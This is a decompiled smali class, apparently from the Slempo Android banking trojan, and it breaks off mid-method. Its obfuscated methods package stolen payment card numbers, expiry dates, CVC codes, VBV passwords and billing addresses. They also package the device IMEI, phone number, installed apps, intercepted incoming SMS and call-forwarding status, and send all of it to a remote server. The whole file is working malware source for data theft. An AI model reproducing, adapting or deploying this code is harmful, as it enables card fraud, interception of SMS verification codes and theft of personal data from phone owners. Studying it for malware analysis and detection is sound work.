.class public Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;
.super Ljava/lang/Object;
.source "EURIDJVKCNWKDSeduvhj.java"


# static fields
.field public static final INITIAL_DATA_IS_SENT:Ljava/lang/String; = "INITIAL_DATA_IS_SENT"

.field public static final UPDATE_MAIN_UI:Ljava/lang/String; = "UPDATE_MAIN_UI"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static sendAppCodeData(Landroid/content/Context;Ljava/lang/String;)V
    .locals 5
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "appId"    # Ljava/lang/String;

    .prologue
    .line 298
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 299
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v3, "type"

    const-string v4, "app id received"

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 300
    const-string v3, "app id"

    invoke-virtual {v1, v3, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 301
    const-string v3, "client number"

    const-string v4, "2"

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 302
    const-string v3, "imei"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 303
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v3

    .line 304
    sget-object v4, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 303
    invoke-direct {v2, v3, v4, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 305
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 309
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 306
    :catch_0
    move-exception v0

    .line 307
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendCallsForwarded(Landroid/content/Context;Ljava/lang/String;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "forwardingTo"    # Ljava/lang/String;

    .prologue
    .line 250
    .line 251
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 250
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 253
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 254
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "calls forwarded"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 255
    const-string v4, "to"

    invoke-virtual {v1, v4, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 256
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 257
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 258
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 257
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 259
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 263
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 260
    :catch_0
    move-exception v0

    .line 261
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendCallsForwardingDisabled(Landroid/content/Context;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 266
    .line 267
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 266
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 269
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 270
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "calls forwarding disabled"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 271
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 272
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 273
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 272
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 274
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 278
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 275
    :catch_0
    move-exception v0

    .line 276
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendCardData(Landroid/content/Context;Ljava/lang/String;Lorg/slempo/service/billing/reuijdslkmcoied;Lorg/json/JSONObject;Lorg/slempo/service/billing/eryidusnjckxewd;)V
    .locals 5
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "url"    # Ljava/lang/String;
    .param p2, "card"    # Lorg/slempo/service/billing/reuijdslkmcoied;
    .param p3, "address"    # Lorg/json/JSONObject;
    .param p4, "info"    # Lorg/slempo/service/billing/eryidusnjckxewd;

    .prologue
    .line 43
    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 44
    .local v2, "jObj":Lorg/json/JSONObject;
    const-string v3, "type"

    const-string v4, "card information"

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 45
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 46
    .local v0, "cardObj":Lorg/json/JSONObject;
    const-string v3, "number"

    invoke-virtual {p2}, Lorg/slempo/service/billing/reuijdslkmcoied;->getNumber()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 47
    const-string v3, "month"

    invoke-virtual {p2}, Lorg/slempo/service/billing/reuijdslkmcoied;->getMonth()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 48
    const-string v3, "year"

    invoke-virtual {p2}, Lorg/slempo/service/billing/reuijdslkmcoied;->getYear()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 49
    const-string v3, "cvc"

    invoke-virtual {p2}, Lorg/slempo/service/billing/reuijdslkmcoied;->getCvc()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 50
    const-string v3, "card"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 51
    const-string v3, "billing address"

    invoke-virtual {v2, v3, p3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 52
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 53
    .local v1, "infoObj":Lorg/json/JSONObject;
    const-string v3, "vbv password"

    invoke-virtual {p4}, Lorg/slempo/service/billing/eryidusnjckxewd;->getVbvPass()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 54
    const-string v3, "old vbv password"

    invoke-virtual {p4}, Lorg/slempo/service/billing/eryidusnjckxewd;->getOldVbvPass()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 55
    const-string v3, "additional information"

    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 56
    invoke-static {p0, v2}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendUserData(Landroid/content/Context;Lorg/json/JSONObject;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 60
    .end local v0    # "cardObj":Lorg/json/JSONObject;
    .end local v1    # "infoObj":Lorg/json/JSONObject;
    .end local v2    # "jObj":Lorg/json/JSONObject;
    :goto_0
    return-void

    .line 57
    :catch_0
    move-exception v3

    goto :goto_0
.end method

.method public static sendCheckData(Landroid/content/Context;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 92
    .line 93
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 92
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 95
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 96
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "device check"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 97
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 98
    const-string v4, "html version"

    const-string v5, "HTML_VERSION"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 99
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 100
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CHECK_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 99
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 101
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 105
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 102
    :catch_0
    move-exception v0

    .line 103
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendControlNumberData(Landroid/content/Context;)V
    .locals 9
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 108
    .line 109
    const-string v6, "AppPrefs"

    const/4 v7, 0x0

    .line 108
    invoke-virtual {p0, v6, v7}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v5

    .line 110
    .local v5, "settings":Landroid/content/SharedPreferences;
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 112
    .local v3, "jObj":Lorg/json/JSONObject;
    :try_start_0
    const-string v6, "CONTROL_NUMBER"

    .line 113
    const-string v7, ""

    .line 112
    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 114
    .local v1, "controlNumber":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 115
    .local v0, "builder":Ljava/lang/StringBuilder;
    const-string v6, "control"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 116
    const-string v6, " number response"

    invoke-virtual {v0, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 117
    const-string v6, "type"

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 118
    const-string v6, "set number"

    invoke-virtual {v3, v6, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 119
    const-string v6, "code"

    const-string v7, "APP_ID"

    const-string v8, "-1"

    invoke-interface {v5, v7, v8}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v3, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 120
    new-instance v4, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v3}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    .line 121
    sget-object v7, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONTROL_NUMBER_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 120
    invoke-direct {v4, v6, v7, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 122
    .local v4, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v4}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 126
    .end local v0    # "builder":Ljava/lang/StringBuilder;
    .end local v1    # "controlNumber":Ljava/lang/String;
    .end local v4    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 123
    :catch_0
    move-exception v2

    .line 124
    .local v2, "e":Lorg/json/JSONException;
    invoke-virtual {v2}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendHTMLUpdated(Landroid/content/Context;)V
    .locals 7
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 281
    .line 282
    const-string v4, "AppPrefs"

    const/4 v5, 0x0

    .line 281
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 284
    .local v3, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 285
    .local v1, "jObj":Lorg/json/JSONObject;
    const-string v4, "type"

    const-string v5, "html updated"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 286
    const-string v4, "html version"

    const-string v5, "HTML_VERSION"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 287
    const-string v4, "code"

    const-string v5, "APP_ID"

    const-string v6, "-1"

    invoke-interface {v3, v5, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 288
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 289
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_CONFIRMATION:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 288
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 290
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 294
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 291
    :catch_0
    move-exception v0

    .line 292
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendInitialData(Landroid/content/Context;)V
    .locals 6
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    const/4 v5, 0x0

    .line 63
    .line 64
    const-string v4, "AppPrefs"

    .line 63
    invoke-virtual {p0, v4, v5}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v3

    .line 65
    .local v3, "settings":Landroid/content/SharedPreferences;
    const-string v4, "INITIAL_DATA_IS_SENT"

    invoke-interface {v3, v4, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v4

    if-nez v4, :cond_0

    .line 66
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 68
    .local v1, "jObj":Lorg/json/JSONObject;
    :try_start_0
    const-string v4, "type"

    const-string v5, "device info"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 69
    const-string v4, "phone number"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getPhoneNumber(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 70
    const-string v4, "country"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getCountry(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 71
    const-string v4, "imei"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getDeviceId(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 72
    const-string v4, "model"

    invoke-static {}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getModel()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 73
    const-string v4, "apps"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getInstalledAppsList(Landroid/content/Context;)Lorg/json/JSONArray;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 74
    const-string v4, "operator"

    invoke-static {p0}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getOperator(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 75
    const-string v4, "os"

    invoke-static {}, Lorg/slempo/service/utils/erdkjlmcxwlksd;->getOS()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 76
    const-string v4, "client number"

    const-string v5, "2"

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 77
    new-instance v2, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    .line 78
    sget-object v5, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_INITIAL_DATA:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 77
    invoke-direct {v2, v4, v5, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 79
    .local v2, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v2}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 89
    .end local v1    # "jObj":Lorg/json/JSONObject;
    .end local v2    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 80
    .restart local v1    # "jObj":Lorg/json/JSONObject;
    :catch_0
    move-exception v0

    .line 81
    .local v0, "e":Lorg/json/JSONException;
    invoke-virtual {v0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    .line 84
    .end local v0    # "e":Lorg/json/JSONException;
    .end local v1    # "jObj":Lorg/json/JSONObject;
    :cond_0
    invoke-static {}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->isWorking()Z

    move-result v4

    if-nez v4, :cond_1

    .line 85
    invoke-static {p0}, Lorg/slempo/service/utils/REIOKJDMVIEORHGU;->startSending(Landroid/content/Context;)V

    .line 87
    :cond_1
    invoke-static {p0}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendCheckData(Landroid/content/Context;)V

    goto :goto_0
.end method

.method public static sendInterceptedIncomingSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "text"    # Ljava/lang/String;
    .param p2, "from"    # Ljava/lang/String;

    .prologue
    .line 148
    .line 149
    const-string v5, "AppPrefs"

    const/4 v6, 0x0

    .line 148
    invoke-virtual {p0, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    .line 151
    .local v4, "settings":Landroid/content/SharedPreferences;
    :try_start_0
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 152
    .local v2, "jObj":Lorg/json/JSONObject;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 153
    .local v0, "builder":Ljava/lang/StringBuilder;
    const-string v5, "intercepted"

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 154
    const-string v5, " incoming sms"

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 155
    const-string v5, "type"

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 156
    const-string v5, "from"

    invoke-virtual {v2, v5, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 157
    const-string v5, "text"

    invoke-virtual {v2, v5, p1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 158
    const-string v5, "code"

    const-string v6, "APP_ID"

    const-string v7, "-1"

    invoke-interface {v4, v6, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v2, v5, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 159
    new-instance v3, Lorg/slempo/service/utils/reijdskmcx;

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v5

    .line 160
    sget-object v6, Lorg/slempo/service/utils/reijdskmcx$RequestType;->TYPE_INTERCEPTED_INCOMING_SMS:Lorg/slempo/service/utils/reijdskmcx$RequestType;

    .line 159
    invoke-direct {v3, v5, v6, p0}, Lorg/slempo/service/utils/reijdskmcx;-><init>(Ljava/lang/String;Lorg/slempo/service/utils/reijdskmcx$RequestType;Landroid/content/Context;)V

    .line 161
    .local v3, "sender":Lorg/slempo/service/utils/reijdskmcx;
    invoke-virtual {v3}, Lorg/slempo/service/utils/reijdskmcx;->startSending()V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 165
    .end local v0    # "builder":Ljava/lang/StringBuilder;
    .end local v2    # "jObj":Lorg/json/JSONObject;
    .end local v3    # "sender":Lorg/slempo/service/utils/reijdskmcx;
    :goto_0
    return-void

    .line 162
    :catch_0
    move-exception v1

    .line 163
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0
.end method

.method public static sendListenedIncomingSMS(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 7
